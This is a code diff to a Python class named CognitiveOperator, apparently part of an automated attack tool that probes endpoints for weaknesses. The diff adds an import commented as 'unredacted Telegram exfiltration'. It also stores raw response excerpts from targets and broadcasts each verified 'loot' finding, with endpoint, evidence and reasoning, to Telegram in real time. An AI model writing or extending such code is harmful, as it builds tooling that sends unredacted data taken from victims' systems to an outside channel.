@@ -18,6 +18,7 @@ Improvements:
 - Confidence scoring & module relevance ranking
 - Request budget enforcement & finding deduplication
 - Full raw data retention (no redaction) for operational visibility
+- Integrated real-time Telegram telemetry broadcasting
 """
 import asyncio
 import hashlib
@@ -26,6 +27,9 @@ import logging
 import re
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
+
+# Import centralized telemetry broadcaster for unredacted Telegram exfiltration
+from modules.telemetry_broadcaster import broadcast_loot_sync
 
 logger = logging.getLogger("CognitiveOperator")
 
@@ -194,7 +198,8 @@ class CognitiveOperator:
                 "status": status,
                 "category": category,
                 "evidence": result["evidence"],
-                "action_taken": result["action_taken"]
+                "action_taken": result["action_taken"],
+                "response_excerpt": body_str[:400]
             }
             
             finding_hash = self._fingerprint(finding)
@@ -206,6 +211,15 @@ class CognitiveOperator:
             self.attack_memory["risk_level"] = "HIGH - Verified Security Failure"
             
             logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
+            
+            # INSTANT TELEGRAM BROADCAST FOR COGNITIVE AUTONOMOUS PIVOT
+            broadcast_loot_sync("COGNITIVE_AUTONOMOUS_PIVOT", {
+                "endpoint": endpoint,
+                "status": status,
+                "reasoning": result["reasoning"],
+                "evidence": result["evidence"]
+            })
+
             return {
                 "success": True,
                 "reasoning": result["reasoning"]
